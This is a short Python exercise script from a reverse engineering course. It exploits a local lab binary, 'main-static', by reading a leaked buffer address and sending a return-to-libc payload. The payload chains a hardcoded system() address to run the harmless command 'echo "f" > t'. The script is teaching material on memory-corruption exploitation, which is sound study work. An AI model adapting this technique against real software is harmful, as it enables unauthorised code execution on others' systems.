#!/usr/bin/python

#
# Reverse Engineering course
# Author: martin.uy/reverse
# License: Creative Commons Attribution-ShareAlike (CC-BY-SA)
#

import sys
import pexpect
import re
import struct

def main():
    ptarget = pexpect.spawn("./main-static", ['env'], env={})
    ptarget.expect("\n")
    ptr_buff = int(ptarget.before, 16)
    print "Buff: "+ hex(ptr_buff)
    


    payload_offset = "0000"
    payload_system_ptr = "0804fba0"
    payload_heaven_ptr = "08048b55"

    payload = payload_offset + reverse_byte_string(payload_system_ptr) + reverse_byte_string(payload_heaven_ptr) + reverse_byte_string(hex(ptr_buff+len(payload_offset)/2 + len(payload_system_ptr)/2 + len(payload_heaven_ptr)/2 + 4).replace("0x", "")) + string_to_hex_string("echo \"f\" > t") +  "00"

    print "payload: " + payload

    ptarget.sendline(payload)

    ptarget.logfile = sys.stdout
    ptarget.expect(pexpect.EOF)

def string_to_hex_string(string):
    hex_string = ""
    for i in string:
        hex_string += hex(ord(i)).replace("0x", "")
    return hex_string

def reverse_byte_string(byte_string):
    reversed_byte_string = ""
    for i in range(0, len(byte_string)):
        if (i % 2) == 0:
            reversed_byte_string = byte_string[i] + byte_string[i+1] + reversed_byte_string
    return reversed_byte_string

if __name__ == "__main__":
    main()
